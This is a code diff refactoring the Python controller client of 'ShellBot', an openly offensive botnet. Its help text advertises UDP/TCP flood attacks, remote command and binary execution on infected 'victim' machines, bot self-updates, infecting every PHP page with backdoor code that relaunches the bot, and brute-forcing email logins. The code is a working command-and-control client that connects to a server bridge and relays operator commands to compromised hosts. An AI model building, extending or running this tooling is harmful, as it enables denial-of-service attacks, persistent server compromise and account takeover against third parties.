@@ -28,7 +28,7 @@ import socket
 import re
 import threading
 
-intro = r"""
+about = r"""\
  ____ ____ ____ ____ ____ ____ ____ ____
 ||S |||h |||e |||l |||l |||B |||o |||t ||
 ||__|||__|||__|||__|||__|||__|||__|||__||
@@ -38,30 +38,31 @@ Coded by: Sayak Brahmachari
 GitHub: https://github.com/sayak-brm
 Website: http://mctrl.ml
 """
-
+usage = "Usage: client.py <server ip> <server bridge port> <password>"
 commands = """
 
 Primary:
 --------
-accept                  | Accept connections
+refresh                 | Refresh connections
 list                    | List connections
 clear                   | Clear the console
 quit                    | Close all connections and quit
-credits                 | Show Credits
+about                   | Display program details
 help                    | Show this message
 
 Client Interaction:
 -------------------
 interact <id>           | Interact with client
-rawexec                 | Execute a binary and pipe the raw I/O to the controller
+rawexec                 | Execute a binary and pipe the raw I/O to the
+                          controller. (Unstable)
 stop                    | Stop interacting with client
 udpflood <ip>:<port>    | UDP flood with client
 tcpflood <ip>:<port>    | TCP flood with client
 setbackdoor <web dir>   | Infects all PHP Pages with Malicious Code that will
-                          run the ShellBot Client (if killed) again.
-rmbackdoor <web dir>    | Removes the Malicious PHP Code
-  Note: Commands sent to clients must not contain semi-colons (;) wxcept when
-  combining multiple lines.
+                          run the ShellBot Client (if killed) again. (Linux)
+rmbackdoor <web dir>    | Removes the Malicious PHP Code. (linux)
+  Note: Commands sent to clients must not contain semi-colons (;) except when
+  combining multiple lines or within quotes.
 
 Wide Commands:
 --------------
@@ -79,20 +80,8 @@ aolbruteforce <email>:<keys>:<min>:<max>
 custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
   Example: custombruteforce smtp.example.com:587:user@example.com:abcdefghi:4:6
 
-\n"""
-
-if len(sys.argv) == 4:
-    host = sys.argv[1]
-    port = int(sys.argv[2])
-    password = sys.argv[3]
-else:
-    #sys.exit("Usage: client.py <server ip> <server bridge port> <password>")
-    print("Usage: client.py <server ip> <server bridge port> <password>")
-    host = '127.0.0.1'
-    port = 9090
-    password = '1234'
-    print("Using default values - {}:{}, password:{}".format(host, port, password))
-
+"""
+# Helper Functions
 def send_msg(sock, sem):
     while True:
         data = sys.stdin.readline()
@@ -106,8 +95,106 @@ def recv_msg(sock):
         if data == 'stop': return
         sys.stdout.write(data)
 
+def rawexec(s, command):
+    sem = threading.Semaphore()
+    sem.acquire(False)
+    s.send(bytes(command, 'utf-8'))
+    sender = threading.Thread(target=send_msg, args=(s, sem,))
+    recver = threading.Thread(target=recv_msg, args=(s,))
+    sender.daemon = True
+    recver.daemon = True
+    sender.start()
+    recver.start()
+    while threading.active_count() > 2:
+        pass
+    sem.release()
+
+def process(s, command):
+    breakit = False
+    if command == "stop":
+        s.send(bytes("stop", 'utf-8'))
+        print("\n")
+        breakit = True
+    elif "rawexec" in command:
+        rawexec(s, command)
+    elif "cd " in command:
+        s.send(bytes(command, 'utf-8'))
+        temp = s.recv(20480).decode()
+        if "ERROR" not in temp:
+            victimpath = temp
+        else: print(temp)
+    elif command == "":
+        print("[CONTROLLER] Nothing to be sent...\n")
+    else:
+        s.send(bytes(command, 'utf-8'))
+        print(s.recv(20480).decode())
+    return breakit
+
+def interact(s, command):
+    s.send(bytes(command, 'utf-8'))
+    temporary = s.recv(20480).decode()
+    if "ERROR" not in temporary:
+        victimpath = s.recv(20480).decode()
+        if "ERROR" not in victimpath:
+            breakit = False
+            while not breakit:
+                msg = input(victimpath)
+                allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
+                for onebyone in allofem:
+                    breakit = process(s, onebyone)
+        else:
+            print(victimpath)
+            return
+    else:
+        print(temporary)
+
+def run(s):
+    command = input("SB> ")
+    try:
+        if command == "refresh":
+            s.send(bytes("refresh", 'utf-8'))
+            print(s.recv(20480).decode())
+        elif command == "list":
+            s.send(bytes("list", 'utf-8'))
+            print(s.recv(20480).decode())
+        elif "interact " in command:
+            interact(s, command)
+        elif "udpfloodall " in command or "tcpfloodall " in command:
+            s.send(bytes(command, 'utf-8'))
+            print("\n")
+        elif command == "selfupdateall":
+            s.send(bytes("selfupdateall", 'utf-8'))
+            print("\n")
+        elif command == "clear":
+            if sys.platform == 'win32':
+                os.system("cls")
+            else:
+                os.system("clear")
+        elif command == "quit":
+            s.send(bytes("quit", 'utf-8'))
+            s.close()
+            return
+        elif command == "help":
+            print(usage, commands)
+        elif command == "about":
+            print(about)
+        else:
+            print("[CONTROLLER] Invalid Command\n")
+    except KeyboardInterrupt:
+        try:
+            s.send(bytes("quit", 'utf-8'))
+            s.close()
+            print("")
+            return
+        except Exception:
+            pass
+    except Exception as ex:
+        print("[CONTROLLER] Connection Closed Due to Error:", ex)
+        s.close()
+        return
+
 def main():
-    print(intro)
+    print(about)
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
@@ -117,99 +204,20 @@ def main():
     s.send(bytes(password, 'utf-8'))
 
     while 1:
-        command = input("SB> ")
-        try:
-            if command == "accept":
-                s.send(bytes("accept", 'utf-8'))
-                print(s.recv(20480).decode())
-            elif command == "list":
-                s.send(bytes("list", 'utf-8'))
-                print(s.recv(20480).decode())
-            elif "interact " in command:
-                s.send(bytes(command, 'utf-8'))
-                temporary = s.recv(20480).decode()
-                if "ERROR" not in temporary:
-                    victimpath = s.recv(20480).decode()
-                    if "ERROR" not in victimpath:
-                        breakit = False
-                        while not breakit:
-                            msg = input(victimpath)
-                            allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
-                            for onebyone in allofem:
-                                if onebyone == "stop":
-                                    s.send(bytes("stop", 'utf-8'))
-                                    print("\n")
-                                    breakit = True
-                                elif "rawexec" in onebyone:
-                                    sem = threading.Semaphore()
-                                    sem.acquire(False)
-                                    s.send(bytes(onebyone, 'utf-8'))
-                                    sender = threading.Thread(target=send_msg, args=(s, sem,))
-                                    recver = threading.Thread(target=recv_msg, args=(s,))
-                                    sender.daemon = True
-                                    recver.daemon = True
-                                    sender.start()
-                                    recver.start()
-                                    while threading.active_count() > 2:
-                                        pass
-                                    sem.release()
-                                elif "cd " in onebyone:
-                                    s.send(bytes(onebyone, 'utf-8'))
-                                    temp = s.recv(20480).decode()
-                                    if "ERROR" not in temp:
-                                        victimpath = temp
-                                    else: print(temp)
-                                elif onebyone == "":
-                                    print("[CONTROLLER] Nothing to be sent...\n")
-                                else:
-                                    s.send(bytes(onebyone, 'utf-8'))
-                                    print(s.recv(20480).decode())
-                    else:
-                        print(victimpath)
-                        break
-                else:
-                    print(temporary)
-            elif "udpfloodall " in command or "tcpfloodall " in command:
-                s.send(bytes(command, 'utf-8'))
-                print("\n")
-            elif command == "selfupdateall":
-                s.send(bytes("selfupdateall", 'utf-8'))
-                print("\n")
-            elif command == "clear":
-                if sys.platform == 'win32':
-                    os.system("cls")
-                else:
-                    os.system("clear")
-            elif command == "quit":
-                s.send(bytes("quit", 'utf-8'))
-                s.close()
-                break
-            elif command == "help":
-                print(commands)
-            elif command == "credits":
-                print(r"""
- ____ ____ ____ ____ ____ ____ ____ ____
-||S |||h |||e |||l |||l |||B |||o |||t ||
-||__|||__|||__|||__|||__|||__|||__|||__||
-|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
+        run(s)
 
-Coded by: Sayak Brahmachari
-GitHub: https://github.com/sayak-brm
-Website: http://mctrl.ml
-""")
-            else:
-                print("[CONTROLLER] Invalid Command\n")
-        except KeyboardInterrupt:
-            try:
-                s.send(bytes("quit", 'utf-8'))
-                s.close()
-                print("")
-                break
-            except Exception:
-                pass
-        except Exception as ex:
-            print("[CONTROLLER] Connection Closed Due to Error:", ex)
-            s.close()
-            break
-
-main()
+if __name__ == "__main__":
+    if len(sys.argv) == 4:
+        host = sys.argv[1]
+        port = int(sys.argv[2])
+        password = sys.argv[3]
+    elif len(sys.argv) == 2 and sys.argv[1] in ['-h', '--help']:
+        print(usage, commands)
+    else:
+        #sys.exit(usage)
+        print(usage)
+        host = '127.0.0.1'
+        port = 9090
+        password = '1234'
+        print("Using default values - {}:{}, password:{}".format(host, port, password))
+    main()
